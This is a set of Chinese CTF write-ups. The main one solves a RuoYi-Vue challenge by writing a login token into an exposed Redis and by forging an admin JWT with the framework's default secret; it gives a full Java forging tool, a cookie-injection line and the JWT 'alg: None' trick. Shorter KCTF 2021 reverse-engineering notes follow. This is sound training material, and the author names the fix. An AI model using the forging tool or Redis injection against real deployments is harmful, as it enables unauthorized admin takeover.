默认控制台管理用户名和密码 admin/admin123，本地配置登录成功后却出现一个异常，导致 UI 不能进入管理界面：

    java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter

可以登录试用的站点 http://vue.ruoyi.vip/login 研究接口。

从使用体验来看，这个项目并不人性化，需要相当专业的人员进行配置才能正常运行。Spring Boot 是一款开箱即用框架，提供各种默认配置来简化项目配置，但是到了 Rouyi 却变得相当复杂的配置。

阅读部署文档，发现目标正好开启了 Redis 6379 端口，并且可以未授权访问。大概了解一下若依的登录逻辑可知，它的用户信息是缓存在 redis 中的，并且通过 JWT 进行认证。

自己搭建一个环境登录 admin 账号后通过 Redis 命令 `keys *` 可查询到一个 login_tokens，目标主机上也有一个：

```sh
$ redis-cli -h 121.36.145.157
121.36.145.157:6379> keys
(error) ERR wrong number of arguments for 'keys' command
121.36.145.157:6379> keys *
1) "login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333"
121.36.145.157:6379>
```

这个 TokenKey 应该关联存储了用户的信息，尝试使用 get 查询关联的数据，为了方便观察，以下直接展示 JSON 数据重要部分：

```rust
# 121.36.145.157:6379> get "login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333"
{

    "password":"$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG",
    "permissions":Set["*:*:*"],
    "token":"07aaf192-ca8f-4db7-a6a2-ee81dbf07d58",
    "user":{
        "admin":true,
        "password":"$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG",
        "roles":[
            {
            "admin":true,
            "dataScope":"1",
            "deptCheckStrictly":false,
            "flag":false,
            "menuCheckStrictly":false,
            "params":{
                "@type":"java.util.HashMap"
            },
            "roleId":1,
            "roleKey":"admin",
            "roleName":"\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98",
            "roleSort":"1",
            "status":"0"}
        ],
        "sex":"1",
        "status":"0",
        "userId":1,
        "userName":"admin"
    },
    "username":"admin"
}
```

以上 JSON 数据对应了一个 `LoginUser.java` 模型对象。

可以在 ruoyi-common 依赖项目中找到这个常量定义，Redis 保存的这个 Key 字符串就是 TokenKey，它包含：

- `LOGIN_TOKEN_KEY` 常量定义的前缀 "login_tokens"；
- 后缀部分为 UUID，对应 `LOGIN_USER_KEY`。

再根据引用找到 TokenService.java 和 SysLoginService.java 这两个代码文件，它们负责 TokenKey 的读取和生成，包括登录验证。

通过重载方法 `createToken` 生成 JWT Token，而 TokenKey 则根据 Token 保存的 UUID 组合而成。

代码分析：

登陆成功后会在 Redis 里写入包含 UUID 的 TokenKey -> 当前用户信息，鉴权时服务器验证机制从 Authorization 获取 Token，而不是 Admin-Token，取出 JWT Token，然后取出 UUID，然后取出用户信息。

从代码可以看到 `LOGIN_USER_KEY` 即 login_user_key 会放入 JWT 的 Payload 中传递给客户端，并且它也是 TokenKey 的后缀。

```java
public LoginUser getLoginUser(HttpServletRequest request)
{
    // 获取请求携带的令牌
    String token = getToken(request);
    if (StringUtils.isNotEmpty(token))
    {
        Claims claims = parseToken(token);
        // 解析对应的权限以及用户信息
        String uuid = (String) claims.get(Constants.LOGIN_USER_KEY);
        String userKey = getTokenKey(uuid);
        LoginUser user = redisCache.getCacheObject(userKey);
        return user;
    }
    return null;
}
```

所以只要在本地搭建一个环境，登录成功后，将本地的 TokenKey 通过目标主机后门写入 Redis 数据库，然后中在浏览器中通过脚本修改 Cookie，将本地的 获取到的 Admin-Token 写入。这样就伪造了一个 admin 用户已经登陆的 redis key + 浏览器 cookie。

去官网的演示站里面登录一下，提取 Admin-token 并 Base64 解码 JWT，可以得到以下两组数据：

    {"alg":"HS512"}
    {"login_user_key":"e8b214c6-997a-4769-a5fe-ec45c863203c"}

步骤：

- 本地搭建好 ruoyi-vue，这个花了不少时间
- 本地登陆 admin/admin123 后，看到本地 Redis 里生成了 login_tokens:{UUID}
- 登陆服务器的 Redis，写入该 key
- 将本地的 cookie 通过 js 写入远程登陆页面
- 刷新后成功进入后台，看到 flag

另一个方法是使用 JWT 签名验证算法生成 Token，结合源码默认 secret 密钥计算得到一个 JWT 的签名用于进行网站访问，如果 application.yml 配置使用的 secret 是默认值就可以绕过登录了。

    # token配置
    token:
        # 令牌自定义标识
        header: Authorization
        # 令牌密钥
        secret: abcdefghijklmnopqrstuvwxyz
        # 令牌有效期（默认30分钟）
        expireTime: 30

生成 Token 后，通过控制台执行脚本修改 cookei，然后再将页面地址修改到登录的首页 http://121.36.145.157/index：

    document.cookie = "Admin-Token=eyJh....";

获取首页显示的 `CTF flag:2435_ert3_Wee`，FLAG提交格式为 `flag{***}`，完成任务。其实出题战队未注意 FLAG 在 Webpack 打包时没有清理，所以通过静态脚本文件也可以找到，真是大意了！

    http://121.36.145.157/static/js/4.js

出题战队说明：

> 这道题并非我刻意制造，若依作为一款使用很广的管理系统，本身的认证逻辑就是这样的，我只是让 Redis 外网可以访问，而且设置了弱口令，其他没做修改，这在实战中还是可能遇到的，其实不只是若依，所有用了 JWT 的系统都可能用的这套逻辑，在实战中可以通过设置比较强的 JWT 秘钥解决这个问题，本题的问题是在于没有修改 JWT 的默认秘钥。我们是通过观察推理的方法解决了这道题，实际上是不严谨的，但是对于比赛时间有限不失为最好的方法。有兴趣的同学可以下载若依的源代码看看，就知道整个事情的来龙去脉了，若依这一套框架体系用到了目前比较主流的开发框架，值得研究。

### 👉 JWT Token 生成工具
- Open Source JWTs For Any Java App https://java.jsonwebtoken.io/

最后，工具代码展示：

```java
package jwtdemo;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class App 
{
    static String LOGIN_USER_KEY = "login_user_key";
    static String secret = "abcdefghijklmnopqrstuvwxyz";

    public static void main( String[] args )
    {
        String uuid = getUUID();
        if(args.length>0) uuid = args[0];
        System.out.println( "UUID: " + uuid );

        System.out.println( "Hello JWT! " + args[0] );
        String token = genToken(uuid);
        System.out.println("login_tokens:" + uuid);
        System.out.println("Authorization: Bearer " + token);
        System.out.println("document.cookie = \"Admin-Token=" + token+"\"");
        String subject = parseToken(token);
        System.out.println("Claims: " + subject);
    }

    public static String genToken(String uuid)
    {
        Map<String, Object> claims = new HashMap<>();
        claims.put(LOGIN_USER_KEY, uuid);

        String token = Jwts.builder()
                .setClaims(claims)
                .signWith(SignatureAlgorithm.HS512, secret).compact();
        return token;
    }

    public static String parseToken(String token)
    {
        Claims claims = Jwts.parser()
                .setSigningKey(secret)
                .parseClaimsJws(token)
                .getBody();
        // String subject = claims.getSubject();
        String uuid = (String) claims.get(LOGIN_USER_KEY);
        return uuid;
    }

    public static String getUUID(){
        UUID uuid = UUID.randomUUID();
        return uuid.toString();
        // return Long.toHexString();
    }
}
```

使用 Maven 创建模板工程 maven-archetype-quickstart，执行以下命令，从提示列表中选择：

    mvn archetype:generate

选好原型 Maven 还会询问项目细节，按要求输入项目细节。

- groupId 指定一个唯一的命名空间，这里指定为 jwtdemo；
- artifactId 项目名指定为 demo，会创建相应的子目录；

完成后，编译运行，参数传入后台 Redis 数据库中已经设置的 UUID：

    mvn compile && mvn exec:java -Dexec.mainClass="jwtdemo.App" -Dexec.args="3845adb5-7e7c-47b6-9b8b-4b4063441f2f A B C"

使用清单文件 MANIFEST.MF，指定主清单属性以方便运行 jar 包，一并配置 maven-jar-plugin 插件：

    Manifest-Version: 1.0
    Archiver-Version: Plexus Archiver
    Built-By: OCEAN
    Created-By: Apache Maven 3.6.3
    Build-Jdk: 1.8.0_191
    Main-Class: jwtdemo.App

配置文件 pom.xml 参考：

```xml
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>jwtdemo</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>
  <packaging>jar</packaging>

  <name>demo</name>
  <url>http://maven.apache.org</url>

  <properties>
    <java.version>1.8</java.version>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <jwt.version>0.9.1</jwt.version>
  </properties>

  <dependencies>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt</artifactId>
        <version>${jwt.version}</version>
    </dependency>

    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>3.8.1</version>
      <scope>test</scope>
    </dependency>
  </dependencies>

  <build>
      <plugins>
          <plugin>
              <groupId>org.apache.maven.plugins</groupId>
              <artifactId>maven-compiler-plugin</artifactId>
              <version>3.1</version>
              <configuration>
                  <source>${java.version}</source>
                  <target>${java.version}</target>
                  <encoding>${project.build.sourceEncoding}</encoding>
              </configuration>
          </plugin>

          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-jar-plugin</artifactId>
            <configuration>
              <archive>
                <manifestFile>src/main/resources/META-INF/MANIFEST.MF</manifestFile>
              </archive>
            </configuration>
          </plugin>

      </plugins>
  </build>

</project>
```


### 👉 JWT 认证机制
- Introduction to JSON Web Tokens https://jwt.io/introduction
- JSON Web Tokens Debugger https://jwt.io/#debugger-io
- 请立刻停止使用 JWT 进行会话管理 https://zhuanlan.zhihu.com/p/372104412
- PASETO - Platform-Agnostic SEcurtiy TOkens https://paseto.io/
- Protocol Versions https://github.com/paragonie/paseto/tree/master/docs/01-Protocol-Versions
- NTLM: How does this protocol work? https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager
- Microsoft Kerberos https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos

JSON Web Token(JWT) 是一个非常轻巧的规范，是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准 (RFC 7519)。

JWT 标准只是设计了一个防篡改令牌，并非是为会话管理而设计，属于一种 JOSE - Javascript Object Signing and Encryption 技术。

该 Token 被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该 Token 也可直接被用于认证，也可被加密。

HTTP 协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行。HTTP 协议并不能告诉你是哪个用户发出的请求，所以为了让应用识别用户，只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为 cookie，以便下次请求时发送给服务端，应用就能通过 cookie 与服务器对应的记录识别用户。

基于 Session 的传统认证问题：

- 服务端要记录所有登录的用户，Session 通常保存在内存中，这会增加服务器内存开销，特别是大量用户的情况。
- 扩展性差，不适合分布系统，服务端认证用户后，做好记录，如果记录在内存，用户下次请求还必须要请求在这台服务器上才能拿到授权的资源。
- 容易受 CSRF 攻击，因为是基于 cookie 来进行用户识别的，如果被截获，用户就会很容易受到跨站请求伪造的攻击。

而基于 Token 的鉴权机制类似于 HTTP 协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于 Token 认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。

JWT 与 Session 最大差别在于，它们都是存储用户信息，然而，Session 是在服务器端的保存数据，而 JWT 是在客户端保存数据。即 Session 的状态数据是存储在服务器端，客户端只有 SessionID，而 Token 的状态存储在客户端，服务器只需要校验 Token 是否合法。

JWT 与 OAuth 的区别：

- OAuth2 是一种授权框架，JWT 是一种认证协议，无论使用哪种方式切记用 HTTPS 来保证数据的安全性。
- OAuth2 用在使用第三方账号登录的情况，而 JWT 是用在前后端分离, 需要简单的对后台 API 进行保护时使用。


JWT 基本流程：

- 用户使用用户名密码来请求服务器
- 服务器验证用户的信息
- 服务器通过验证后给用户一个 Token 
- 客户端存储 Token，并在每次请求时附带
- 服务端验证 Token 值，并返回数据

这个 Token 必须要在每次请求时传递给服务端，它应该保存在请求头里，另外，服务端要支持 CORS(跨来源资源共享)策略，一般可以在服务端设置 Access-Control-Allow-Origin: * 。

在认证的时候，当用户用他们的凭证成功登录以后，一个 JSON Web Token 将会被返回，用户用此凭证访问授权的资源，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。

无论何时用户想要访问受保护的路由或者资源的时候，用户代理（通常是浏览器）都应该带上 JWT。

典型的，通常放在 Authorization 请求头中，用 Bearer schema，看起来是这样的：

    Authorization: Bearer YOUR_TOKEN

服务器上的受保护的路由将会检查 Authorization 携带的 JWT 是否有效，如果有效，则用户可以访问受保护的资源。如果 JWT 包含足够多的必需的数据，那么就可以减少对某些操作的数据库查询的需要，尽管可能并不总是如此。

如果 Token 是在授权头（Authorization header）中发送的，那么就不会有跨源资源共享(CORS)问题，因为它不使用 cookie。

JSON Web Token 由三部分组成，它们是圆点(.)连接的 Base64 编码的内容：

    Header.Payload.Signature
    xxxxxx.yyyyyyy.zzzzzzzzzzzz

JWT 的签名使用 HMAC 或基于公钥密钥对的算法 RSA、ECDSA。

典型的 Header 是一个 JSON，包含 Token 的类型和算法，经过 Base64 编码就得到 JWT 的 Header 部分：

    {
        'alg': "HS256",
        'typ': "JWT"
    }

第二部分是 Payload，也是 JSON 数据，包含声明（要求），是关于实体(通常是用户)和其他数据的声明，有三种类型：

- Registered claims 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。
- Public claims 可以随意定义。
- Private claims 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。

下面是一个 Payload 例子：

    {
      "sub": "1234567890",
      "name": "John Doe",
      "admin": true
    }

最后是签名部分，这也是最重要的部分，通过不可逆转的加密算法从 Header 和 Playload 生成签名，以保证数据不会被纂改。并且，对于使用私钥签名的 Token，它还可以验证 JWT 的发送方是否为它所称的发送方。

以下是一个使用 HMAC 算法的签名过程，secret 是加密使用的密钥：

    HMACSHA256(
      base64UrlEncode(header) + "." +
      base64UrlEncode(payload),
      secret)

然后，将三者的 Base64 编码内容使用点号拼接就是一个完整的 JWT，可以使用 jwt.io Debugger 来体验。

JWT 的缺点：

- 会话数据存储在客户端，且在每次请求中携带，增加泄露风险；
- 每次请求需传递更多数据，增加流量开销；
- 服务端不方便吊销会话，实现各种会话策略管理；

还有一点，Token 具有时效，在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全，但也带来 Token 刷新续期问题。还有一个概念叫 Token 撤销，它允许我们根据相同的授权许可使特定的甚至是一组 Token 无效。

JWT 支持将算法设定为“None”，如果你使用 JWT 库时未设置关闭该功能，那么任何 Token 都是有效的。具体做法是将 JWT 第一部分 header 中 alg 字段设置为 None ，再将第三部分 signature 设置为空，即不添加 signature 字段， 此 Token 可顺利通过验证。

就个建议是使用更新的 PASETO 替代 JWT。


## ⚡2021KCTF 春季赛 Q4
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-173.htm
- 2021 KCTF 武汉科锐 CR38 期 CrackMe https://bbs.pediy.com/thread-267320.htm

看雪.深信服2021KCTF春季赛 第四题 英雄救美

此题是一道 Windows 逆向题，若序列号有多解，平台不认可提交的注册码，请加比赛专用QQ群：8601428，联系管理员验证。

本题实现说明
本题中输入的key是9X9数独游戏（数独.png）的唯一解，此key会进行md5加密，得到的hash值会解密一段shellcode。错误的key则无法获得shellcode。

详细说明
9x9的数独存放在一个全局的二维数组中，破解者输入一串密钥。然后根据这个密钥转换为在这个数独中应该填写的数字，判断其行是否合法、列是否合法以及粗线宫是否合法。如果合法则计算其md5，然后aes解密shellcode。解密正确的话则会正常执行shellcode，从而弹出input correct的消息框，否则就没有这个消息框，自动退出程序了。

正确的key

    :u$YBPf2pa]Dt4#QM^H4ic'j0`w2y{d-Zzo2%/n_s@+2<UW)e4AR;F.4=-qEkvC2

翻翻数据看到这个：

.data:004187C0     dd      0, 4, 0, 7, 0, 0, 0, 0, 0
.data:004187E4     dd      9, 2, 0, 0, 0, 0, 6, 0, 7
.data:00418808     dd      8, 3, 0, 0, 0, 5, 4, 0, 0
.data:0041882C     dd      0, 1, 0, 0, 0, 3, 0, 0, 0
.data:00418850     dd      0, 0, 0, 2, 0, 1, 0, 0, 0
.data:00418874     dd      0, 0, 0, 5, 0, 0, 0, 4, 0
.data:00418898     dd      0, 0, 4, 9, 0, 0, 0, 7, 1
.data:004188BC     dd      3, 0, 5, 0, 0, 0, 0, 9, 4
.data:004188E0     dd      0, 0, 0, 0, 0, 8, 0, 6, 0

```c
int b[9][9] = {
    {5,6,1,9,2,3,8,0,0},
    {1,8,3,4,5,0,0,0,0},
    {7,6,2,1,9,0,0,0,0},
    {7,8,4,6,9,2,5,0,0},
    {4,5,3,9,7,8,6,0,0},
    {6,9,2,8,7,1,3,0,0},
    {2,8,5,6,3,0,0,0,0},
    {6,1,7,2,8,0,0,0,0},
    {1,7,9,3,4,5,2,0,0},
};
 
void s04()
{
    int i,j;
    char *t = "$BPV:ubfYp}]DtN>aT^MGmJQ#*Hr`O'wjic0!hdy{oZz-@n+?&%s_/g<e[W)XUxRFSLRA;.l=CEkvK-(q";
 
    for (j=0;j<9;j++)
    {
        for (i=0;i<9;i++)
        {
            if (b[j][i])
            {
                printf("%c", t[j*9 + b[j][i]-1]);
            }
            else
            {
                printf("%d\n",9-i);
                break;
            }
        }
    }
}
```




## ⚡2021KCTF 春季赛 Q5
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-174.htm
- 2021 KCTF 春季赛 防守篇 https://bbs.pediy.com/thread-266222.htm
- 2021 KCTF 第五题 华山论剑 https://bbs.pediy.com/thread-266937.htm

第五题 华山论剑

此题是一道 Android 逆向题，使用规则参考防守篇 5.2.2 方案二，防守方发布 CrackMe 应向大众公开一组用户名和序列号，即 “Name/Serial” ，其中公开的这个用户名，必须是该 CrackMe 文件的 hash 值且算法指定为 SHA256，用户名为 hash 结果的前 64-bit 的 16 进制大写文字。

如果 CrackMe 不止一个文件的话，计算 hash 时应包含 CrackMe 的所有文件（第三方共享库除外）。

```sh
# 公开的一组序列号：
name:ed8b9244350d3644
serial:7C9815255BFE832D3F93140B
```

判胜条件：若攻击方找出特定用户名（“KCTF”，不含引号） 的序列号，将认定攻击方获胜。

先使用 md5sum 和 sha256sum 计算一下文件摘要，可以看到文件 SHA256 的前 64-bit 一致：

```sh
$ md5sum KCTF-2.sign.apk
7010e85266f2f59d20075d2ac9fb2d80  KCTF-2.sign.apk
$ sha256sum KCTF-2.sign.apk
ed8b9244350d3644f014d27e18dbda65d90f6581658d06cb4773de87f2d9d738  KCTF-2.sign.apk
```

使用 adx-gui-1.2.0.exe 直接查看 APK 中的 Java 代码，其中关键点是按键点击事件：

```java
public native String stringFromJNI(String str, String str2);

public void Btn1_Click(View view) {
    String str;
    String input = this.text.getText().toString();
    String input2 = this.text2.getText().toString();
    if (input == null || input.isEmpty()) {
        str = "name为空";
    } else if (input2 == null || input2.isEmpty()) {
        str = "serial为空";
    } else {
        System.loadLibrary("hello-jni");
        str = stringFromJNI(input, input2);
    }
    AlertDialog.Builder builder = new AlertDialog.Builder(mContext);
    builder.setTitle("");
    builder.setMessage(str);
    builder.show();
}
```

通过 loadLibrary 加载 APK 中的库文件 \lib\armeabi\libhello-jni.so，库文件导出一个 stringFromJNI 函数，这是下一步要进行跟踪的代码。

关键信息包括函数签名，返回一个字符串指针，指向字符串“恭喜成功”，传入两个字符串指针。

IDA 加载动态库，但是 Exports 窗口中找不到相应的导出方法，通过快捷键 Ctrl+F 也找不到 JNI_OnLoad 入口函数。

使用 IDA 的 android_server 调试 APK 时默认使用端口是 23946，可能有反调试代码会检测此端口是否占用，所以保险起见不妨使用别的端口。

可以使用 ./android_server -p12345 指定端口，也可以使用 IDA 打补丁直接逆向修改默认端口。打开 IDA 载入 android_server，进入 main 函数，按 F5 查看伪代码，定位到 23946（0x5dba）位置，直接修改即可。 可以把 5D BA 改为 39 30，即 12345 端口。

然后将调试服务程序传送到 Android 系统，可以使用 /data 目录：

    $ adb push C:\IDA_Pro_7.6\dbgsrv\android_server64 /data
    $ adb shell chmod +rwx /data/android_server64

    $ adb shell /data/android_server -p23946
    IDA Android 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020
    Listening on 0.0.0.0:23946...

Apktool 可以用来 解压 APK，如果直接使用 unzip 解压可能得到一些不可阅读的文件，如 AndroidManifest.xml 是二进制编码的格式。

    apktool_2.5.0.jar d KCTF-2.sign.apk

从 AndroidManifest.xml 文件可以查询到程序的 Activity 入口类名，然后安装需要调试的 APK 并执行等等待调试：

    $ adb install \ctf\q5\KCTF-2.sign.apk
    $ adb shell am start -D -n com.example.hellojni/.HelloJni
    Starting: Intent { cmp=com.example.hellojni/.HelloJni }

使用 -D 参数目的是调试程序的启动过程，此时 Android 设备上会给出提示：“Waiting For Debugger”，表示正在等待调试器的链接。

也可以让 APP 正常启动，然后 IDA 依然可以 attach 到已经运行的进程上，但是这样无法调试到 APP 启动阶段的逻辑。

注意，直接传递到 /sdcard 将导致不能修改可执行权限，传送到 /bin 目录可能遇到 Read-only 问题。

连接 android_server 调试服务后发现只有一个可疑的符号，但指令格式完全不对，重复的 MOVS R0, R0，也无法断点运行：

```java
text:000010E4 Java_com_example_hellojni_HelloJni_stringFromJNI
.text:000010E4                                         ; DATA XREF: LOAD:000001B8↑o
.text:000010E4                                         ; .got:Java_com_example_hellojni_HelloJni_stringFromJNI_ptr↓o
.text:000010E4 ; __unwind {
.text:000010E4                 PUSH            {LR}
.text:000010E6                 BL              sub_5000
.text:000010EA                 MOVS            R0, R0
.text:000010EC                 MOVS            R0, R0
...
```

这种情况超出现有认知，感觉是花指令导致 IDA 反汇编失败，没有正确解析 ARM 和 Thumb 指令代码。

下一步安排就是赶紧补课，阅读 IDA Pro 权威教程，先过一遍，等其它人公布 writeup 总结经验再说。

    查看模块加载基地址cat /proc/7009/maps |grep hello

    需要打开Dalvik Debug Monitor(DDMS)，不过难得这么有心。
    DDMS 要打开,app的debuggable要为true,实在不行的话都关掉再重新开始

    我有打开DDMS，正常附加了，但是貌似没法调试，不知道哪里出了问题。
    还有，我jdb连接的端口那里，因为我调试的是安卓模拟器，端口非8600/8700，所以我把这里的端口改成了安卓模拟器通信端口（64XXX），这应该没问题吧？


    BL是 IDA 配置的问题，刚开始我也疑惑了很久，arm的标准一直在演进（例如 v5、v7），这个 so 在声明时使用的是 v5（使用 readelf -A），但这个机器码疑似是 v7 才有的，导致 IDA 识别错误（也可能是 IDA 本身默认就是这个错误的配置）。

    正确的 IDA 配置方式： IDA options -> Processor specific analysis options -> Edit ARM architecture options -> ARMv5T -> Thumb-2 

出题思路：

其中规则 2 的两组序列号如下：

    name:ed8b9244350d3644
    serial:7C9815255BFE832D3F93140B

    name:KCTF
    serial:17726331DA0fE737149c8202
 
设计思路：
1.对输入name字符串通过SHA1算法(稍微改动)计算得到24字节的hash值
2.hash值做明文和Java_com_example_hellojni_HelloJni_stringFromJNI地址做密钥K参与rc4运算(稍作修改)，其中hash前12字节与密钥流按位做异或并与hash后12字节按位相加得到新的12字节串值
3.将新得到的十六进制12字节串转换为ASCII码形式即为24字节的serial值

保护方法:
通过汇编实现了一套模拟add/sub/eor/push/pop等指令的函数块，对so的函数指令流做分析，需要保护的指令做指令跳转替换后生成位置无关的shellcode，并patch到so的末尾生成新so文件，原函数的头部替换成跳转指令跳转到patch位置执行，被保护后的add/sub...等指令，会以跳转指令的形式跳到对应的模拟函数执行。

 
解题思路：
由于demo编译后通过，对代码段的指令做了变形保护，通过相同功能的函数实现指令替代运行，所以反编译时，不容易看出算法逻辑，需要对模拟代码标识出相应的指令来分析逻辑，当然也存在不需要标记的情况，只需要找到关键做异或之处即可：首先在文件偏移0x6448下断点，在0x76A8就可以跟踪出serial的结果。

关于作者
目前就职于梆梆安全，从事多年二进制保护工作方面的研究，期间也负责移动app合规检查,app软件安全测评及固件安全测评等工作。


## ⚡2021KCTF 春季赛 Q6
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-175.htm

看雪.深信服 2021KCTF 春季赛 第六题 寻回宝剑

此题是一道 Windows 逆向题


## ⚡2021KCTF 春季赛 Q7
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-176.htm

第七题 千里寻根


## ⚡2021KCTF 春季赛 Q8
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-177.htm

第八题 众叛亲离


## ⚡2021KCTF 春季赛 Q9
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-178.htm

第九题 平定战乱


## ⚡2021KCTF 春季赛 Qa
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-179.htm

第十题 一统江湖
